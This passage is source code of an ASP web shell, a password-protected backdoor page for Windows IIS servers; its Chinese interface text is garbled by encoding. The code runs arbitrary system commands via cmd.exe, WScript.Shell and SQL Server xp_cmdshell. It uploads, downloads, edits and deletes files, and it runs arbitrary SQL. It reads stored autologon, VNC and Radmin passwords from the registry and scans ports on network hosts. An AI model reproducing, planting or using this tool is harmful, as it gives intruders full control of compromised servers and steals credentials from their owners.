			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=�ָ����>"
			   RESPONSE.WRITE "</FORM>"

		           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>ϵͳ���"
			   RESPONSE.WRITE "  <INPUT NAME=CMD TYPE=TEXT>"
			   RESPONSE.WRITE "<SELECT NAME='TOOL' ><OPTION VALUE=''>----��ѡ�����г�������----</OPTION><OPTION VALUE=XP_CMDSHELL>XP_CMDSHELL</OPTION><OPTION VALUE=SP_OACREATE>SP_OACREATE</OPTION><OPTION VALUE=XP_REGWRITE>XP_REGWRITE</OPTION><OPTION VALUE=SQLSERVERAGENT>SQLSERVERAGENT</OPTION></OPTION></SELECT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=CMD>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=ִ��>"
			   RESPONSE.WRITE "</FORM>"
		           RESPONSE.WRITE "<FORM NAME=FORM1 METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>ִ����䣺"
			   RESPONSE.WRITE "   <INPUT NAME=SQL TYPE=TEXT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=SQL>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=ִ��>"			   
			   RESPONSE.WRITE "</FORM>"
 END IF
End Function

Function DownFile(Path)
Response.Clear
Set OSM = CreateObject(ObT(6,0))
OSM.Open
OSM.Type = 1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM = Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S= replace(S,">","&gt;")
S=replace(S,"<","&lt;")
S=replace(S,CHR(39),"&#39;")
S=replace(S,CHR(34),"&quot;")
S=replace(S,CHR(20),"&nbsp;")
HTMLEncode=S
end if
End Function
Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	RRS SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr>"&url&"</form></table>"
  RRS SI
End Function

Function Cmd1Shell()
checked=" checked"
If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath = "cmd.exe"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd = Request("cmd")
SI="<form method='post'>"
SI=SI&"SHELL·����<input name='SP' value='"&ShellPath&"' Style='width:70%'>  "
SI=SI&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell"
SI=SI&"<input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='ִ��'><textarea Style='width:100%;height:440;' class='cmd'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(ObT(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject("WScript.Shell")
Set ws=Server.CreateObject("WScript.Shell")
Set fso=Server.CreateObject("Scripting.FileSystemObject")
szTempFile = server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
Set fs = CreateObject("Scripting.FileSystemObject")
Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></form>"
RRS SI
End Function

Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "�����ɹ�!"
   End If
   SI=SI&BackUrl 
   RRS SI
End function

Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�з��֣�</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ���ɹ���</center>"
  End If
  SI=SI&BackUrl
  RRS SI
End Function

if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
response.redirect url
else
 rrs"<br><br><br><br><br><br><br><br><center>�ҿ����㲻�������͵İ�!</center>"
end if
else
si="<center><div style='width:400;border:1px solid lime;padding:10px;margin:100px;color:lime;font-family: Comic Sans MS;'><b><font style=""FONT-SIZE: 25px; FILTER: shadow(color=red); WIDTH: 100%; COLOR: #00FF00; LINE-HEIGHT: 300%; FONT-FAMILY: Comic Sans MS"" color=""#00FF00""><a href='"&SitEURL&"' target='_blank'>"&mname&"</a></font></b><hr size=1 color=lime><form action='"&url&"' method='post'>���룺<input name='PaSs' type='PaSsword' size='22'> <input type='submit' value='��¼'><hr size=1 color=lime>"&Copyright&"</center>"
if instr(SI,SIC)<>0 thEn rrs sI
end if
response.end
end If

FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD����<input type=text name=MMD size=35 ><input type=text name=U value=mssql�û���><input type=text name=P value=mssql����><input type=submit value=ִ��></form></tr></table>":REsPonsE.writE SI:SI="":If trim(REquEst.form("MMD"))<>""  thEn:PaSsword= trim(REquEst.form("P")):id=trim(REquEst.form("U")):set adoConn=SErvEr.CreateObject("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;PaSsword="&PaSsword&";UsEr ID="&id:strQuery = "exec master.dbo.xp_cmdshell '" & REquEst.form("MMD") & "'":set recREsult = adoConn.Execute(strQuery):If NOT recREsult.EOF thEn:Do While NOT recREsult.EOF:strREsult = strREsult & chr(13) & recREsult(0):recREsult.MoveNext:Loop:End if:set recREsult = Nothing:strREsult = REplAcE(strREsult," ","&nbsp;"):strREsult = REplAcE(strREsult,"<","&lt;"):strREsult = REplAcE(strREsult,">","&gt;"):strREsult = REplAcE(strREsult,chr(13),"<br>"):End if:set adoConn = Nothing:REsPonsE.WritE REquEst.form("MMD") & "<br>"& strREsult
end Function
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'>  ���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'> SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href=""javascript:if(confirm('ȷ��ɾ��ô��'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"ִ����䣺"&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	RRS SI:SI=""
	SqlStr=HtmlEnCode(SqlStr)
    SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&" ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      SI=SI&"  <a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a> "
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&" "
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a> "
        End If
      Next
	  SI=SI&" <a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	RRS SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL��䣺"&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function

Dim T1:Class UPC:Dim D1,D2:Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function:Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function:Private Sub Class_Initialize:Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub
set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1.Read:DStart=1:DEnd=LenB(TDa):set D2=CreateObject(Sot(4,0)):vbCrlf=chrB(13)&chrB(10):set T2=CreateObject(Sot(6,0)):TSt=MidB(TDa,1,InStrB(DStart,TDa,vbCrlf)-1):TLen=LenB(TSt):DStart=DStart+TLen+1:while (DStart+10)<DEnd:DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DStart:T1.CopyTo T2,DIEnd-DStart:T2.Position=0:T2.Type=2:T2.Charset="gb2312":TIn=T2.ReadText:T2.Close:DStart=InStrB(DIEnd,TDa,TSt):FStart=InStr(22,TIn,"name=""",1)+6:FEnd=InStr(FStart,TIn,"""",1):UpName=lcase(Mid(TIn,FStart,FEnd-FStart)):if InStr (45,TIn,"filename=""",1)>0 then
set TFL=new FIF:FStart=InStr(FEnd,TIn,"filename=""",1)+10:FEnd=InStr(FStart,TIn,"""",1):FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14:FEnd=InStr(FStart,TIn,vbCr):TFL.FileStart=DIEnd:TFL.FileSize=DStart-DIEnd-3:if not D2.Exists(UpName) then:D2.add UpName,TFL:end if
else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset ="gb2312":SFV = T2.ReadText:T2.Close:if D1.Exists(UpName) then:D1(UpName)=D1(UpName)&","&SFV:else:D1.Add UpName,SFV:end if:end if:DStart=DStart+TLen+1:wend:TDa="":set T2=nothing:End Sub:Private Sub Class_Terminate:if Request.TotalBytes>0 then:D1.RemoveAll:D2.RemoveAll:set D1=nothing:set D2=nothing:T1.Close:set T1 =nothing:end if:End Sub:End Class
Class FIF:dim FileSize,FileStart:Private Sub Class_Initialize:FileSize=0:FileStart=0:End Sub:Public function SaveAs(F)
dim T3:SaveAs=true:if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(Sot(6,0)):T3.Mode=3:T3.Type=1:T3.Open:T1.position=FileStart:T1.copyto T3,FileSize:T3.SaveToFile F,2:T3.Close:set T3=nothing:SaveAs=false:end function:End Class
Class LBF:Dim CF:Private Sub Class_Initialize:SET CF=CreateObject(ObT(0,0)):End Sub:Private Sub Class_Terminate:Set CF=Nothing:End Sub:Function ShowDriver()
For Each D in CF.Drives
      RRS"   <a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>"&face("ff8000",0,"8")&"���ش��� ("&D.DriveLetter&":)</a><br>" 
    Next
    End Function:Function Show1File(Path)
      Set FOLD=CF.GetFolder(Path)
  i=0
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td height=10>"
    SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""��""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>" 
	SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>����</a>"
    SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>�ƶ�</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='����'>����</a></td>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=2></td></tr></table>"
	RRS SI &"<hr noshade size=1 color=""#"" />" : SI=""
  For Each L in Fold.files
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    SI=SI&"<tr style='boungroup-color:#'>"
	SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>�༭</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>����</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a></td>"	
    SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
	SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
    SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
    SI=SI&"</tr></table>"
	RRS SI:SI=""
  Next
  Set FOLD=Nothing
  End function:Function DelFile(Path)
  If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>�ļ� "&Path&" ɾ���ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function:Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>�ļ�����ɹ���</center>"
SI=SI&BackUrl
RRS SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�"
End If
SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
RRS SI
End Function:Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
	End Function:Function MoveFile(Path)
	  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
	End Function:Function DelFolder(Path)
	    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function CopyFolder(Path)
	  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function MoveFolder(Path)
	  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function NewFolder(Path)
	    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:End Class
	sub getTerminalInfo()
On Error Resume Next
Response.Write "<br><br>[����˿�̽��]<br><hr size=1>"
Set wsh = Server.CreateObject("WScript.Shell")
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23"
Response.Write "<li>Telnet�˿�:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="�޷���ȡ.��ȷ���Ƿ�ΪWindows Server�汾����"
Response.Write "<li>Terminal Service�˿�Ϊ:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="�޷���ȡ.��ȷ�������Ƿ�װpcAnywhere"
Response.Write "<li>PcAnywhere�˿�Ϊ:"&PAWPort&"<br>"
Response.Write "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RRS "�ն˷���˿ڼ��Զ���¼<hr/><ol>"
If termPort = "" Or Err.Number <> 0 Then 
RRS"�޷��õ��ն˷���˿�, ����Ȩ���Ƿ��Ѿ��ܵ�����.<br/>"
 Else
RRS "��ǰ�ն˷���˿�: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
RRS "ϵͳ�Զ���¼����δ����<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RRS "�Զ���¼��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RRS "False"
End If
RRS "�Զ���¼���ʻ�����: " & autoLoginPassword & "<br>"
End If
RRS "</ol>"
End Sub

sub ReadREG()
RrS"ע����ֵ��ȡ:<hr/>"
RrS"<form method=post>"
RrS"<input type=hidden value=readReg name=theAct>"
RrS"<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RrS" <input type=submit value=' ��ȡ '><br><br>"
RrS"<input type=hidden value=vnc name=vnc>"
RrS"<input name=vnc value='HKCU\Software\ORL\WinVNC3\Password' size=80 type=hidden>"
RrS" <input type=submit value=' ��ȡVNC���� '>  "
RrS"<input type=hidden value=readReg name=radmin>"
RrS"<input name=radmin value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin' size=80 type=hidden>"
RrS" <input type=submit value=' ��ȡRadmin���� '>  <br><br><br>"
RrS"HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {����ʾ�ϴε�¼�û�}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=ȱʡ,1=�����û��޷��оٱ����û��б�,2=�����û��޷����ӱ���IPC$����}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {��ֹĬ�Ϲ���}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {�ر����繲��}<br/><br>"
RrS"HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {����TCP/IPɸѡ(����������)}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {����IP·��}<br/><br>"
RrS"-------�����ƺ�Ҫ���󶨵�����,��֪���Ƿ�׼ȷ---------<br/><p></p>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ĭ������}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {��DNS}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {�����TCP/IP�˿�}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {�����UDP�˿�}<br/><br>"
RrS"-----------OVER--------------------<br/><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {����������}<br/><br><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {��ǰ����������(��������滻)}<br/><br>"
RrS"<span id=regeditInfo style='display:none;'><hr/>"
RrS"</span>"
RrS"</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RrS"<li>" & theArray(i)
Next
 Else
RrS"<li>" & theArray
End If
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,80,88,8080,1433,3306,3389,4899,5631,5631,6059,6129,43958,65500"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>�˿�ɨ����(���ɨ�����˿�,�ٶȱȽ���,�����Ƽ�ʹ��CMD)</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP: "
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' scan '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
RRS("<b>ɨ�豨��:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
